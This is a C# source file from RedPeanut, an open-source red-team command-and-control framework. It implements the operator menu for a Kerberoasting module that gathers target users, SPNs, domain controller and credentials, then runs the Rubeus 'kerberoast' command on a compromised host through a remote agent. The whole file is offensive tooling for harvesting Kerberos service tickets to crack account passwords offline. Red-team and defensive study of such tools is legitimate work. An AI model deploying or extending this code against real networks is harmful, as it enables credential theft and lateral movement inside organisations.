//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class RubeusKerberoastManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set user", "Set user" },
            { "set spn", "Set spn" },
            { "set ou", "Set ou" },
            { "set outfile", "Set outfile" },
            { "set creduser", "Set cred user (DOMAIN.FQDN\\USER)" },
            { "set credpassword", "Set cred password" },
            { "set domain", "Set domain" },
            { "set dc", "Set set domain controller" },
            { "set usetgtdeleg", "Set usetgtdeleg flag" },
            { "set rc4opsec", "Set rc4opsec flag" },
            { "set aes", "Set aes flag" },
            { "set ticket", "Set kirbi file or base64 rep" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        IAgentInstance agent = null;
        string modulename = "kerberoast";
        string user;
        string spn;
        string ou;
        string outfile;
        string creduser;
        string credpassword;
        string domain;
        string dc;
        bool usetgtdeleg;
        bool rc4opsec;
        bool aes;
        string ticket;

        public RubeusKerberoastManager()
        {

        }

        public RubeusKerberoastManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                RubeusKerberoastMenu(input);
            } while (input != "back");
        }

        private void RubeusKerberoastMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set user":
                            user = GetParsedSetString(input);
                            break;
                        case "set spn":
                            spn = GetParsedSetString(input);
                            break;
                        case "set ou":
                            ou = GetParsedSetString(input);
                            break;
                        case "set outfile":
                            outfile = GetParsedSetString(input);
                            break;
                        case "set creduser":
                            creduser = GetParsedSetString(input);
                            break;
                        case "set credpassword":
                            credpassword = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set dc":
                            dc = GetParsedSetString(input);
                            break;
                        case "set usetgtdeleg":
                            usetgtdeleg = GetParsedSetBool(input);
                            break;
                        case "set rc4opsec":
                            rc4opsec = GetParsedSetBool(input);
                            break;
                        case "set aes":
                            aes = GetParsedSetBool(input);
                            break;
                        case "set ticket":
                            ticket = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        
        private void Run()
        {
            List<string> args = new List<string>();
            args.Add("kerberoast");

            if (!string.IsNullOrEmpty(user))
            {
                args.Add("/user:" + user);
            }

            if (!string.IsNullOrEmpty(spn))
            {
                args.Add("/spn:" + spn);
            }

            if (!string.IsNullOrEmpty(ou))
            {
                args.Add("/ou:" + ou);
            }

            if (!string.IsNullOrEmpty(outfile))
            {
                args.Add("/outfile:" + outfile);
            }

            if (!string.IsNullOrEmpty(creduser))
            {
                args.Add("/creduser:" + creduser);
            }

            if (!string.IsNullOrEmpty(credpassword))
            {
                args.Add("/credpassword:" + credpassword);
            }

            if (!string.IsNullOrEmpty(domain))
            {
                args.Add("/domain:" + domain);
            }

            if (!string.IsNullOrEmpty(dc))
            {
                args.Add("/dc:" + dc);
            }

            if (usetgtdeleg)
            {
                args.Add("/usetgtdeleg");
            }

            if (rc4opsec)
            {
                args.Add("/rc4opsec");
            }

            if (aes)
            {
                args.Add("/aes");
            }

            if (!string.IsNullOrEmpty(ticket))
            {
                args.Add("/ticket:" + ticket);
            }

            RunAssembly(PL_MODULE_RUBEUS, "Rubeus.Program", args.ToArray<string>(), agent);

        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "user", user },
                { "spn", spn },
                { "ou", ou },
                { "outfile", outfile },
                { "creduser", creduser },
                { "credpassword", credpassword },
                { "domain", domain },
                { "dc", dc },
                { "usetgtdeleg", usetgtdeleg.ToString() },
                { "rc4opsec", rc4opsec.ToString() },
                { "aes", aes.ToString() },
                { "ticket", ticket }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }

    }
}

